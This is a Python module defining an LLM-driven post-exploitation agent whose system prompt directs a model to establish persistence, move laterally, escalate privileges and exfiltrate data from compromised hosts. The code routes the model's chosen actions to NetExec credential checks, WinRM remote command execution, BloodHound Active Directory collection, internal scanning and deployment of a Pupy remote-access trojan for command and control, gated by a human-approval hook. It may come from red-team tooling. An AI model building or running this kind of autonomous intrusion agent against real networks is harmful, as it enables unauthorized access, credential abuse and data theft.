import json, logging, os
from typing import Optional

from orchestrator.agents.base import (
    BaseAgent, GoalType, Task, AgentContext, Finding, ToolDef, Thought,
)
from orchestrator.agents.exploit import _check_hitl
from orchestrator.events import EventBus, event_bus
from orchestrator.providers import call_model, resolve_persona_override

logger = logging.getLogger("postex_agent")

POSTEX_PROMPT = (
    "You are an operator managing compromised hosts. Establish persistence, "
    "move laterally, escalate privileges, exfiltrate data.\n\n"
    "Available tools:\n"
    "  - netexec: NetExec (formerly CrackMapExec) — SMB/WMI/SSH/RDP service check\n"
    "  - winrm: WinRM command execution on Windows targets\n"
    "  - bloodhound: BloodHound collector — AD relationship mapping\n"
    "  - ladon: Ladon scanner — network/service discovery from inside\n"
    "  - pupy: Pupy RAT — persistent C2 session\n\n"
    "Output ONLY valid JSON:\n"
    '{"actions": [{"tool": "tool_name", "args": {"target": "...", "credential": "..."}}]}\n\n'
    "SAFETY RULES:\n"
    "  - All actions require HITL approval (enforced by system)\n"
    "  - Never rm -rf, format, dd, or destroy evidence\n"
    "  - If no credentials available, output {\"actions\": []}\n"
    "  - Max 2 actions per cycle"
)

POSTEX_TOOLS = {
    "netexec": ToolDef(name="netexec", description="SMB/WMI/SSH service check with creds"),
    "winrm": ToolDef(name="winrm", description="WinRM command execution"),
    "bloodhound": ToolDef(name="bloodhound", description="BloodHound AD collector"),
    "ladon": ToolDef(name="ladon", description="Internal network scan"),
    "pupy": ToolDef(name="pupy", description="Pupy RAT persistent C2 session"),
}


class PostExAgent(BaseAgent):
    name: str = "postex"
    system_prompt: str = POSTEX_PROMPT
    tools: list[ToolDef] = list(POSTEX_TOOLS.values())
    max_iterations: int = 5
    max_consecutive_failures: int = 2

    def __init__(self, bus: Optional[EventBus] = None, persona: str = ""):
        super().__init__(bus)
        self.persona = persona
        self._system_override = resolve_persona_override(persona) if persona else None

    async def think(self, task: Task, context: AgentContext,
                    system_override: Optional[str] = None) -> Thought:
        previous_findings = [f.to_dict() for f in context.findings[-20:]] if context.findings else []
        prompt_messages = [{"role": "user", "content": json.dumps({
            "goal": task.goal_type.value,
            "target": task.target,
            "iteration": context.iteration,
            "previous_findings": previous_findings,
            "available_tools": list(POSTEX_TOOLS.keys()),
        })}]

        so = system_override or self._system_override
        llm_output = await call_model("auto", prompt_messages, max_tokens=512,
                                      temperature=0.3, system_override=so)
        try:
            data = json.loads(llm_output)
            actions = data.get("actions", [])
        except (json.JSONDecodeError, ValueError):
            logger.warning(f"[postex] LLM output not JSON, no actions")
            actions = []

        return Thought(actions=actions, reasoning="")

    async def execute(self, action: dict) -> list[Finding]:
        tool = action.get("tool", "")
        args = action.get("args", {})
        target = args.get("target", "")
        findings = []

        if not _check_hitl(f"{tool} on {target}", target):
            logger.info(f"[postex] HITL rejected: {tool} on {target}")
            return findings

        try:
            if tool == "netexec":
                findings = await self._run_netexec(target, args)
            elif tool == "winrm":
                findings = await self._run_winrm(target, args)
            elif tool == "bloodhound":
                findings = await self._run_bloodhound(target)
            elif tool == "ladon":
                findings = await self._run_ladon(target)
            elif tool == "pupy":
                findings = await self._run_pupy(target)
            else:
                logger.warning(f"[postex] Unknown tool: {tool}")
        except Exception as e:
            logger.warning(f"[postex] Tool {tool} failed: {e}")

        return findings

    async def _run_netexec(self, target: str, args: dict) -> list[Finding]:
        from orchestrator.postex.netexec_wrapper import NetExecWrapper
        nx = NetExecWrapper()
        domain = args.get("domain", "")
        username = args.get("username", "")
        password = args.get("password", "")
        try:
            result = nx.smb_check(target, domain=domain, username=username, password=password)
            if result and "error" not in result:
                return [Finding(
                    agent=self.name, goal_type=GoalType.POSTEX,
                    target=target, description="NetExec SMB check",
                    severity="high" if result.get("success") else "info",
                    evidence=str(result)[:500],
                )]
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        return []

    async def _run_winrm(self, target: str, args: dict) -> list[Finding]:
        from orchestrator.postex.winrm_exploit import WinRMExploit
        wr = WinRMExploit()
        username = args.get("username", "")
        password = args.get("password", "")
        command = args.get("command", "whoami")
        try:
            result = wr.execute(target, username, password, command=command)
            if result and "error" not in result:
                return [Finding(
                    agent=self.name, goal_type=GoalType.POSTEX,
                    target=target, description=f"WinRM: {command}",
                    severity="high",
                    evidence=str(result)[:500],
                )]
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        return []

    async def _run_bloodhound(self, target: str) -> list[Finding]:
        from orchestrator.postex.bloodhound_integration import BloodHoundIntegration
        bh = BloodHoundIntegration()
        try:
            result = bh.collect(target)
            if result and "error" not in result:
                return [Finding(
                    agent=self.name, goal_type=GoalType.POSTEX,
                    target=target, description="BloodHound AD collection",
                    severity="medium",
                    evidence=str(result)[:500],
                )]
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        return []

    async def _run_ladon(self, target: str) -> list[Finding]:
        from orchestrator.postex.ladon_scanner import LadonScanner
        ls = LadonScanner()
        try:
            result = ls.scan(target)
            if result and "error" not in result:
                return [Finding(
                    agent=self.name, goal_type=GoalType.POSTEX,
                    target=target, description="Ladon internal scan",
                    severity="info",
                    evidence=str(result)[:500],
                )]
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        return []

    async def _run_pupy(self, target: str) -> list[Finding]:
        from orchestrator.postex.pupy_c2 import PupyC2
        pc = PupyC2()
        try:
            result = pc.deploy(target)
            if result and "error" not in result:
                return [Finding(
                    agent=self.name, goal_type=GoalType.POSTEX,
                    target=target, description="Pupy C2 deployment",
                    severity="critical",
                    evidence=str(result)[:500],
                )]
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        return []
